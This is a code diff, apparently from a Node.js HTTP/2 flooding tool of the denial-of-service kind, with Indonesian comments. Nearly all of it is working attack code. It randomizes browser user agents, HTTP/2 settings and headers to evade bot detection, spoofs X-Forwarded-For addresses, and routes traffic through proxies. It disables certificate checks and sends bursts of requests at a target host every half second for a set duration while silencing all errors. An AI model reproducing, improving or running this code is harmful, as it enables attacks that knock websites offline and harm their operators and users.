+            ["SETTINGS_HEADER_TABLE_SIZE", 4096],
+            ["SETTINGS_ENABLE_PUSH", false],
+            ["SETTINGS_MAX_CONCURRENT_STREAMS", 1000],
+            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
+            ["SETTINGS_MAX_FRAME_SIZE", 16384],
+            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
+        ],
+        firefox: [
+            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
+            ["SETTINGS_ENABLE_PUSH", false],
+            ["SETTINGS_MAX_CONCURRENT_STREAMS", 100],
+            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
+            ["SETTINGS_MAX_FRAME_SIZE", 16384],
+            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
+        ],
+        mobile: [
+            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
+            ["SETTINGS_ENABLE_PUSH", false],
+            ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
+            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
+            ["SETTINGS_MAX_FRAME_SIZE", 16384],
+            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
+        ],
+        opera: [
+            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
+            ["SETTINGS_ENABLE_PUSH", false],
+            ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
+            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
+            ["SETTINGS_MAX_FRAME_SIZE", 16384],
+            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
+        ],
+        operagx: [
+            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
+            ["SETTINGS_ENABLE_PUSH", false],
+            ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
+            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
+            ["SETTINGS_MAX_FRAME_SIZE", 16384],
+            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
+        ],
+        safari: [
+            ["SETTINGS_HEADER_TABLE_SIZE", 4096],
+            ["SETTINGS_ENABLE_PUSH", false],
+            ["SETTINGS_MAX_CONCURRENT_STREAMS", 100],
+            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
+            ["SETTINGS_MAX_FRAME_SIZE", 16384],
+            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
+        ],
+        duckduckgo: [
+            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
+            ["SETTINGS_ENABLE_PUSH", false],
+            ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
+            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
+            ["SETTINGS_MAX_FRAME_SIZE", 16384],
+            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
+        ]
+    };
+    return Object.fromEntries(settings[browser]);
+};
+const generateHeaders = (browser) => {
+    const versions = {
+    chrome: { min: 115, max: 124 },
+    safari: { min: 14, max: 16 },
+    brave: { min: 115, max: 124 },
+    firefox: { min: 99, max: 112 },
+    mobile: { min: 85, max: 105 },
+    opera: { min: 70, max: 90 },
+    operagx: { min: 70, max: 90 },
+    duckduckgo: { min: 12, max: 16 }
+};
+
+    const version = Math.floor(Math.random() * (versions[browser].max - versions[browser].min + 1)) + versions[browser].min;
+    const fullVersions = {
+    brave: "90.0.4430.212",
+    chrome: "90.0.4430.212",
+    firefox: "88.0",
+    safari: "14.1",
+    mobile: "90.0.4430.212",
+    opera: "90.0.4430.212",
+    operagx: "90.0.4430.212",
+    duckduckgo: "7.0"
+};
+
+    const secChUAFullVersionList = Object.keys(fullVersions)
+        .map(key => `"${key}";v="${fullVersions[key]}"`)
+        .join(", ");
+    const platforms = {
+    chrome: "Win64",
+    safari: "macOS",
+    brave: "Linux",
+    firefox: "Linux",
+    mobile: "Android",
+    opera: "Linux",
+    operagx: "Linux",
+    duckduckgo: "macOS"
+};
+    const platform = platforms[browser];
+
+    const userAgents = {
+    chrome: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 10)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36`,
+    firefox: `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${Math.floor(99 + Math.random() * 15)}.0) Gecko/20100101 Firefox/${Math.floor(99 + Math.random() * 15)}.0`,
+    safari: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${Math.floor(12 + Math.random() * 4)}_${Math.floor(0 + Math.random() * 4)}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${Math.floor(12 + Math.random() * 4)}.0 Safari/605.1.15`,
+    opera: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 10)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 OPR/${Math.floor(90 + Math.random() * 10)}.0.${Math.floor(Math.random() * 5000)}.0`,
+    operagx: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 10)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 OPR/${Math.floor(90 + Math.random() * 10)}.0.${Math.floor(Math.random() * 5000)}.0 (Edition GX)`,
+    brave: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 10)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 Brave/${Math.floor(1 + Math.random() * 4)}.${Math.floor(0 + Math.random() * 10)}.${Math.floor(0 + Math.random() * 500)}`,
+    mobile: `Mozilla/5.0 (Linux; Android ${Math.floor(10 + Math.random() * 4)}; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 10)}.0.${Math.floor(Math.random() * 5000)}.0 Mobile Safari/537.36`,
+    duckduckgo: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${Math.floor(12 + Math.random() * 4)}_${Math.floor(0 + Math.random() * 4)}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${Math.floor(12 + Math.random() * 4)}.0 DuckDuckGo/7 Safari/605.1.15`
+};
+    const secFetchUser = Math.random() < 0.75 ? "?1;?1" : "?1";
+const secChUaMobile = browser === "mobile" ? "?1" : "?0";
+const acceptEncoding = Math.random() < 0.5 ? "gzip, deflate, br, zstd" : "gzip, deflate, br";
+const accept = Math.random() < 0.5 
+  ? "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" 
+  : "application/json";
+  
+const secChUaPlatform = Math.random() < 0.5 ? '"Windows"' : '"Linux"';
+const secChUaFull = Math.random() < 0.5 ? '"Google Chrome";v="118", "Chromium";v="118"' : '"Mozilla Firefox";v="118"';
+const secFetchDest = Math.random() < 0.5 ? "document" : "image";
+const secFetchMode = Math.random() < 0.5 ? "navigate" : "cors";
+const secFetchSite = Math.random() < 0.5 ? "same-origin" : "cross-site";
+
+const acceptLanguage = Math.random() < 0.5 
+  ? "en-US,en;q=0.9" 
+  : Math.random() < 0.5 
+  ? "en-GB,en;q=0.9" 
+  : "es-ES,es;q=0.8,en;q=0.7";
+
+const acceptCharset = Math.random() < 0.5 ? "UTF-8" : "ISO-8859-1";
+
+const connection = Math.random() < 0.5 ? "keep-alive" : "close";
+
+const xRequestedWith = Math.random() < 0.5 ? "XMLHttpRequest" : "Fetch";
+
+const referer = Math.random() < 0.5 
+  ? "https://www.google.com" 
+  : "https://www.bing.com";
+  
+const xForwardedFor = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
+
+const te = Math.random() < 0.5 ? "trailers" : "gzip";
+
+const cacheControl = Math.random() < 0.5 ? "no-cache" : "max-age=3600";
+// Path acak yang lebih bervariasi
+function getRandomPath() {
+    const paths = [
+        "/about", 
+        "/products", 
+        "/contact", 
+        "/news", 
+        "/services", 
+        "/blog/post-" + Math.floor(Math.random() * 1000), 
+        "/article/" + Math.floor(Math.random() * 1000),
+        "/category/" + Math.floor(Math.random() * 10),
+        "/shop/product-" + Math.floor(Math.random() * 500),
+        "/portfolio", 
+        "/faq", 
+        "/support", 
+        "/store/item-" + Math.floor(Math.random() * 1000),
+        "/events/" + Math.floor(Math.random() * 200)
+    ];
+    return paths[Math.floor(Math.random() * paths.length)];
+}
+    const headersMap = {
+    brave: {
+        ":method": "GET",
+        ":authority": Math.random() < 0.5 
+            ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
+            : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
+        ":scheme": "https",
+        ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10),
+        "sec-ch-ua": `"Brave";v="${Math.floor(115 + Math.random() * 10)}", "Chromium";v="${Math.floor(115 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
+        "sec-ch-ua-mobile": Math.random() < 0.5 ? "?1" : "?0",
+        "sec-ch-ua-platform": Math.random() < 0.5 ? "Windows" : "Android",
+        "accept": `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8, application/json;q=0.5`,
+        "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "6.1" : "10.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(100 + Math.random() * 50)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 Brave/${Math.floor(115 + Math.random() * 10)}.0.0.0`,
+        "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9", // Variasi bahasa
+        "accept-encoding": "gzip, deflate, br",
+        "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://brave.com/", // Variasi referer
+        "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
+        "sec-fetch-dest": "document",
+        "sec-fetch-mode": "navigate",
+        "sec-fetch-site": "same-origin", // Same-origin lebih alami
+        "sec-fetch-user": "?1",
+        "dnt": "1", // Do Not Track
+        "upgrade-insecure-requests": "1",
+        "cache-control": "max-age=0"
+    },
+    chrome: {
+        ":method": "GET",
+        ":authority": Math.random() < 0.5 
+            ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
+            : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
+        ":scheme": "https",
+        ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10),
+        "sec-ch-ua": `"Chromium";v="${Math.floor(115 + Math.random() * 10)}", "Google Chrome";v="${Math.floor(100 + Math.random() * 50)}", "Not-A.Brand";v="99"`,
+        "sec-ch-ua-mobile": Math.random() < 0.5 ? "?1" : "?0", // Acak mobile/non-mobile
+        "sec-ch-ua-platform": Math.random() < 0.5 ? "Windows" : "Android", // Variasi platform
+        "accept": `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8, application/json;q=0.5`,
+        "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "6.1" : "10.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(100 + Math.random() * 50)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36`,
+        "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9", // Variasi bahasa
+        "accept-encoding": "gzip, deflate, br",
+        "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://brave.com/", // Variasi referer
+        "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
+        "sec-fetch-dest": "document",
+        "sec-fetch-mode": "navigate",
+        "sec-fetch-site": "same-origin", // Same-origin lebih alami
+        "sec-fetch-user": "?1",
+        "dnt": "1", // Do Not Track
+        "upgrade-insecure-requests": "1",
+        "cache-control": "max-age=0"
+    },
+    safari: {
+        ":method": "GET",
+        ":authority": Math.random() < 0.5 
+            ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
+            : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
+        ":scheme": "https",
+        ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10),
+        "sec-ch-ua": `"Safari";v="${Math.floor(115 + Math.random() * 10)}", "AppleWebKit";v="${Math.floor(537 + Math.random() * 20)}"`,
+        "sec-ch-ua-mobile": Math.random() < 0.5 ? "?1" : "?0", // Acak mobile/non-mobile
+        "sec-ch-ua-platform": Math.random() < 0.5 ? "macOS" : "iOS", // Variasi platform
+        "accept": `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8, application/json;q=0.5`,
+        "user-agent": `Mozilla/5.0 (Macintosh; Intel Mac OS X ${Math.random() < 0.5 ? "10_14_6" : "10_15_7"}) AppleWebKit/537.36 (KHTML, like Gecko) Version/${Math.floor(13 + Math.random() * 10)}.${Math.floor(Math.random() * 10)} Safari/537.36`,
+        "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9", // Variasi bahasa
+        "accept-encoding": "gzip, deflate, br",
+        "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://www.apple.com/", // Variasi referer
+        "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
+        "sec-fetch-dest": "document",
+        "sec-fetch-mode": "navigate",
+        "sec-fetch-site": "same-origin", // Same-origin lebih alami
+        "sec-fetch-user": "?1",
+        "dnt": "1", // Do Not Track
+        "upgrade-insecure-requests": "1",
+        "cache-control": "max-age=0"
+    },
+    mobile: {
+        ":method": "GET",
+        ":authority": Math.random() < 0.5 
+            ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
+            : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
+        ":scheme": "https",
+        ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10),
+        "sec-ch-ua": `"Chromium";v="${Math.floor(115 + Math.random() * 10)}", "Google Chrome";v="${Math.floor(100 + Math.random() * 50)}", "Not-A.Brand";v="99"`,
+        "sec-ch-ua-mobile": "?1", // Menunjukkan perangkat mobile
+        "sec-ch-ua-platform": "Android", // Platform mobile
+        "accept": `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8, application/json;q=0.5`,
+        "user-agent": `Mozilla/5.0 (Linux; Android ${Math.floor(9 + Math.random() * 5)}.${Math.floor(Math.random() * 10)}; Mobile; rv:${Math.floor(60 + Math.random() * 10)}) Gecko/20100101 Firefox/${Math.floor(70 + Math.random() * 10)}.0`,
+        "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9", // Variasi bahasa
+        "accept-encoding": "gzip, deflate, br",
+        "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://m.example.com/", // Variasi referer
+        "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
+        "sec-fetch-dest": "document",
+        "sec-fetch-mode": "navigate",
+        "sec-fetch-site": "same-origin", // Same-origin lebih alami
+        "sec-fetch-user": "?1",
+        "dnt": "1", // Do Not Track
+        "upgrade-insecure-requests": "1",
+        "cache-control": "max-age=0"
+    },
+    firefox: {
+        ":method": "GET",
+        ":authority": Math.random() < 0.5 
+            ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
+            : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
+        ":scheme": "https",
+        ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10),
+        "sec-ch-ua": `"Mozilla Firefox";v="${Math.floor(70 + Math.random() * 10)}", "Gecko";v="20100101", "Not-A.Brand";v="99"`,
+        "sec-ch-ua-mobile": Math.random() < 0.5 ? "?0" : "?1", // Variasi mobile/non-mobile
+        "sec-ch-ua-platform": Math.random() < 0.5 ? "Windows" : "Linux", // Variasi platform
+        "accept": `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8, application/json;q=0.5`,
+        "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "6.1"}; Win64; x64; rv:${Math.floor(70 + Math.random() * 10)}) Gecko/20100101 Firefox/${Math.floor(70 + Math.random() * 10)}.0`,
+        "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9", // Variasi bahasa
+        "accept-encoding": "gzip, deflate, br",
+        "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://www.mozilla.org/", // Variasi referer
+        "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
+        "sec-fetch-dest": "document",
+        "sec-fetch-mode": "navigate",
+        "sec-fetch-site": "same-origin", // Same-origin lebih alami
+        "sec-fetch-user": "?1",
+        "dnt": "1", // Do Not Track
+        "upgrade-insecure-requests": "1",
+        "cache-control": "max-age=0"
+    },
+    opera: {
+        ":method": "GET",
+        ":authority": Math.random() < 0.5 
+            ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
+            : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
+        ":scheme": "https",
+        ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10),
+        "sec-ch-ua": `"Opera";v="${Math.floor(75 + Math.random() * 10)}", "Chromium";v="${Math.floor(115 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
+        "sec-ch-ua-mobile": Math.random() < 0.5 ? "?1" : "?0", // Variasi mobile/non-mobile
+        "sec-ch-ua-platform": Math.random() < 0.5 ? "Windows" : "Linux", // Variasi platform
+        "accept": `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8, application/json;q=0.5`,
+        "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "6.1"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(100 + Math.random() * 50)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 OPR/${Math.floor(75 + Math.random() * 10)}.0.0.0`,
+        "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9", // Variasi bahasa
+        "accept-encoding": "gzip, deflate, br",
+        "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://www.opera.com/", // Variasi referer
+        "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
+        "sec-fetch-dest": "document",
+        "sec-fetch-mode": "navigate",
+        "sec-fetch-site": "same-origin", // Same-origin lebih alami
+        "sec-fetch-user": "?1",
+        "dnt": "1", // Do Not Track
+        "upgrade-insecure-requests": "1",
+        "cache-control": "max-age=0"
+    },
+    operagx: {
+        ":method": "GET",
+        ":authority": Math.random() < 0.5 
+            ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
+            : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
+        ":scheme": "https",
+        ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10),
+        "sec-ch-ua": `"Opera GX";v="${Math.floor(80 + Math.random() * 10)}", "Chromium";v="${Math.floor(115 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
+        "sec-ch-ua-mobile": "?0", // Opera GX sebagian besar untuk desktop
+        "sec-ch-ua-platform": "Windows", // Opera GX umumnya digunakan di Windows
+        "accept": `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8, application/json;q=0.5`,
+        "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "11.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(100 + Math.random() * 50)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 OPR/${Math.floor(80 + Math.random() * 10)}.0.0.0 GX`,
+        "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9", // Variasi bahasa
+        "accept-encoding": "gzip, deflate, br",
+        "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://www.opera.com/gx", // Referer yang cocok untuk Opera GX
+        "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
+        "sec-fetch-dest": "document",
+        "sec-fetch-mode": "navigate",
+        "sec-fetch-site": "same-origin", // Same-origin untuk kesan alami
+        "sec-fetch-user": "?1",
+        "dnt": "1", // Do Not Track
+        "upgrade-insecure-requests": "1",
+        "cache-control": "max-age=0"
+    },
+    duckduckgo: {
+        ":method": "GET",
+        ":authority": Math.random() < 0.5 
+            ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
+            : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
+        ":scheme": "https",
+        ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10),
+        "sec-ch-ua": `"DuckDuckGo";v="${Math.floor(115 + Math.random() * 10)}", "Chromium";v="${Math.floor(115 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
+        "sec-ch-ua-mobile": Math.random() < 0.5 ? "?1" : "?0", // Variasi antara mobile dan desktop
+        "sec-ch-ua-platform": Math.random() < 0.5 ? "Windows" : "Android", // Platform Windows atau Android
+        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+        "user-agent": `Mozilla/5.0 (${Math.random() < 0.5 ? "Windows NT 10.0; Win64; x64" : "Linux; Android 11"}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(100 + Math.random() * 50)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 DuckDuckGo/${Math.floor(10 + Math.random() * 5)}.0`,
+        "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9", // Variasi bahasa
+        "accept-encoding": "gzip, deflate, br",
+        "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://duckduckgo.com/", // Variasi referer
+        "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
+        "sec-fetch-dest": "document",
+        "sec-fetch-mode": "navigate",
+        "sec-fetch-site": "same-origin", // Same-origin untuk kesan alami
+        "sec-fetch-user": "?1",
+        "dnt": "1", // Do Not Track
+        "upgrade-insecure-requests": "1",
+        "cache-control": "max-age=0"
+}
+};
+
+    return headersMap[browser];
+};
+const browser = getRandomBrowser();
+const headers = generateHeaders(browser);
+let h2_config;
+const h2settings = h2Settings(browser);
+h2_config = transformSettings(Object.entries(h2settings));
+function getWeightedRandom() {
+    const randomValue = Math.random() * Math.random();
+    return randomValue < 0.25;
+}
+const randomString = randstr(10);
+
+                        const headers4 = {
+                            ...(getWeightedRandom() && Math.random() < 0.4 && { 'x-forwarded-for': `${randomString}:${randomString}` }),
+                            ...(getWeightedRandom() && { 'referer': `https://${randomString}.com` })
+                        }
+
+                        let allHeaders = Object.assign({}, headers, headers4);
+
+
+const proxyOptions = {
+    host: parsedProxy[0],
+    port: ~~parsedProxy[1],
+    address: `${parsedTarget.host}:443`,
+    timeout: 10
+};
+
+Socker.HTTP(proxyOptions, async (connection, error) => {
+    if (error) return;
+    connection.setKeepAlive(true, 600000);
+    connection.setNoDelay(true);
+
+    const settings = {
+        initialWindowSize: 15663105,
+    };
+
+    const tlsOptions = {
+        secure: true,
+        ALPNProtocols: ["h2", "http/1.1"],
+        ciphers: cipper,
+        requestCert: true,
+        sigalgs: sigalgs,
+        socket: connection,
+        ecdhCurve: ecdhCurve,
+        secureContext: secureContext,
+        honorCipherOrder: false,
+        rejectUnauthorized: false,
+        minVersion: 'TLSv1.2',
+        maxVersion: 'TLSv1.3',
+        secureOptions: secureOptions,
+        host: parsedTarget.host,
+        servername: parsedTarget.host,
+    };
+    
+    const tlsSocket = tls.connect(parsedPort, parsedTarget.host, tlsOptions);
+    
+    tlsSocket.allowHalfOpen = true;
+    tlsSocket.setNoDelay(true);
+    tlsSocket.setKeepAlive(true, 60000);
+    tlsSocket.setMaxListeners(0);
+    
+    function generateJA3Fingerprint(socket) {
+        const cipherInfo = socket.getCipher();
+        const supportedVersions = socket.getProtocol();
+    
+        if (!cipherInfo) {
+            //console.error('Cipher info is not available. TLS handshake may not have completed.');
+            return null;
+        }
+    
+        const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${supportedVersions}:${cipherInfo.bits}`;
+    
+        const md5Hash = crypto.createHash('md5');
+        md5Hash.update(ja3String);
+    
+        return md5Hash.digest('hex');
+    }
+    
+    tlsSocket.on('connect', () => {
+        const ja3Fingerprint = generateJA3Fingerprint(tlsSocket);
+    });
+    let hpack = new HPACK();
+    let client;
+    client = http2.connect(parsedTarget.href, {
+        protocol: "https",
+        createConnection: () => tlsSocket,
+        settings : h2settings,
+        socket: tlsSocket,
+    });
+    
+    client.setMaxListeners(0);
+    
+    const updateWindow = Buffer.alloc(4);
+    updateWindow.writeUInt32BE(Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105, 0);
+    client.on('remoteSettings', (settings) => {
+        const localWindowSize = Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105;
+        client.setLocalWindowSize(localWindowSize, 0);
+    });
+    
+    const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
+    const frames = [
+        Buffer.from(PREFACE, 'binary'),
+        encodeFrame(0, 4, encodeSettings([...h2_config])),
+        encodeFrame(0, 8, updateWindow)
+    ];
+    
+    client.on('connect', async () => {
+        const intervalId = setInterval(async () => {
+            const shuffleObject = (obj) => {
+                const keys = Object.keys(obj);
+                for (let i = keys.length - 1; i > 0; i--) {
+                    const j = Math.floor(Math.random() * (i + 1));
+                    [keys[i], keys[j]] = [keys[j], keys[i]];
+                }
+                const shuffledObj = {};
+                keys.forEach(key => shuffledObj[key] = obj[key]);
+                return shuffledObj;
+            };
+    
+            const randomItem = (array) => array[Math.floor(Math.random() * array.length)];
+    
+            const dynHeaders = shuffleObject({
+                ...allHeaders,
+                ...(Math.random() < 0.5 ? {"Cache-Control": "max-age=0"} :{}),
+                ...(Math.random() < 0.5 ? {["MOMENT" + randstr(4)]: "POLOM" + generateRandomString(1,5) } : {["X-FRAMES" + generateRandomString(1,4)]: "NAVIGATE"+ randstr(3)})
+            });
+    
+            const packed = Buffer.concat([
+                Buffer.from([0x80, 0, 0, 0, 0xFF]),
+                hpack.encode(dynHeaders)
+            ]);
+    
+            const streamId = 1;
+            const requests = [];
+            let count = 0;
+    
+            if (tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
                 for (let i = 0; i < args.Rate; i++) {
-                    //headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(25);
-                    const request = client.request(headers)
-                    
-                    .on("response", response => {
-                        request.close();
-                        request.destroy();
-                        return
+                    const requestPromise = new Promise((resolve, reject) => {
+                        const req = client.request(dynHeaders)
+                        .on('response', response => {
+                            req.close();
+                            req.destroy();
+                            resolve();
+                        });
+                        req.on('end', () => {
+                            count++;
+                            if (count === args.time * args.Rate) {
+                                clearInterval(intervalId);
+                                client.close(http2.constants.NGHTTP2_CANCEL);
+                            }
+                            reject(new Error('Request timed out'));
+                        });
+    
+                        req.end();
                     });
     
-                    request.end();
+                    const frame = encodeFrame(streamId, 1, packed, 0x1 | 0x4 | 0x20);
+                    requests.push({ requestPromise, frame });
                 }
-            }, 1000); 
-         });
- 
-         client.on("close", () => {
-             client.destroy();
-             connection.destroy();
-             return
-         });
-     }),function (error, response, body) {
-		};
- }
- console.log(gradient.passion(`FLOODS`));
- const KillScript = () => process.exit(1);
- setTimeout(KillScript, args.time * 1000);
+    
+                await Promise.all(requests.map(({ requestPromise }) => requestPromise));
+                client.write(Buffer.concat(frames));
+            }
+        }, 500);  
+    });
+    
+        client.on("close", () => {
+            client.destroy();
+            connection.destroy();
+            return;
+        });
+
+        client.on("error", error => {
+            client.destroy();
+            connection.destroy();
+            return;
+        });
+        });
+    }
+const StopScript = () => process.exit(1);
+
+setTimeout(StopScript, args.time * 1000);
+
+process.on('uncaughtException', error => {});
+process.on('unhandledRejection', error => {});
